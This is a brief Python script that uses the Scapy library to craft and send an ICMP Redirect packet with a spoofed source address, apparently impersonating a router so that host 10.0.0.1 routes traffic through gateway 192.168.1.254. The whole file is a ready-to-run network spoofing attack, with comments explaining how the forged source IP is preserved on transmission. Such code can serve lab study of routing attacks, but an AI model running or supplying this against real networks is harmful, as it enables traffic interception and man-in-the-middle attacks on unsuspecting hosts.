from scapy.all import *

# Original IP header with source and destination addresses
original_ip = IP(src="10.0.0.1", dst="10.0.0.2")

# Original UDP header with source and destination ports
original_udp = UDP(sport=1234, dport=80)

# Define a payload for the UDP packet
udp_payload = b"Example UDP payload"

# Combine the original IP and UDP headers with the payload to create the original packet
original_packet = original_ip / original_udp / udp_payload

# ICMP Redirect message type and code
icmp_redirect = ICMP(type=5, code=1, gw="192.168.1.254") / original_packet[:28]

# New IP header for the ICMP packet with spoofed source IP
new_ip = IP(src="192.168.1.1", dst="10.0.0.1")

# Combine the new IP header with the ICMP redirect message
redirect_packet = new_ip / icmp_redirect

# Print the final packet details for verification
print("ICMP Redirect Packet:")
redirect_packet.show()

# Send the packet at the data link layer to preserve the crafted source IP
sendp(Ether() / redirect_packet, iface="eth0")
